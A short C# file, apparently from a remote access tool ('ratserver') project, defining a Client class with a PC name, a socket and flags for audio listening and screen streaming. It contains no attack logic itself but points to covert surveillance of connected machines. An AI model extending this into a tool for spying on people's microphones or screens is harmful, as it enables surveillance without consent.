using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Text;

namespace ratserver
{
    public class Client
    {
        public string PCName;
        public Socket Socket;
        public bool ListeningAudio = false;
        public bool StreamingScreen = false;
    }
}
